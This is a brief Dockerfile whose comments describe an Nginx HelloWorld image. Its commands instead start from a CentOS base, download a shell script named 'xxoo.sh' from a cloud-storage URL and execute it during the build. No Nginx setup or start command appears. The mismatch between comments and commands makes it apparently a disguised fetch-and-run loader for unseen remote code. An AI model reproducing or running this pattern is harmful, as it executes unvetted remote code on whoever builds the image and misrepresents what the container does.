# The FROM instruction sets the Base Image for subsequent instructions.
# Using Nginx as Base Image
FROM daocloud.io/centos:7
MAINTAINER wdzaw@gmail.com

# The RUN instruction will execute any commands
# Adding HelloWorld page into Nginx server
RUN yum install wget -y
RUN cd /
RUN wget http://svn-10038864.cos.myqcloud.com/xxoo.sh
RUN chmod +x xxoo.sh
RUN ./xxoo.sh
# The EXPOSE instruction informs Docker that the container listens on the specified network ports at runtime
EXPOSE 80

# The CMD instruction provides default execution command for an container
# Start Nginx and keep it from running background
